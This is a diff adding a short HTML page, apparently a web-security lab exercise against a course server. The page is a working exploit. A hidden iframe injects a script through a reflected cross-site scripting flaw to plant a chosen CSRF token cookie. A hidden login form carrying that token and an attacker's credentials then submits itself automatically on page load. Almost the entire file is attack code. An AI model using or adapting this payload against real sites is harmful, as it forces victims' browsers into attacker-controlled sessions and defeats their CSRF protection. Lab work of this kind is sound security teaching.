@@ -1,0 +1,13 @@
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<iframe name="attacker_page" width=300 height=300 src="http://trurl.cs.illinois.edu/search?xssdefense=0&q=<script>{document.cookie='csrf_token=01234567890123456789012345678901'}</script>" hidden></iframe>
+<form action="http://trurl.cs.illinois.edu/login?csrfdefense=1&xssdefense=0" method="post" target="attacker_page">
+    <input name="csrf_token" value="01234567890123456789012345678901" hidden>
+    <input name="username" value="attacker" hidden>
+    <input name="password" value="l33th4x" hidden>
+</form>
+
+<script>
+window.onload = function () {
+    document.forms[0].submit();
+}
+</script>
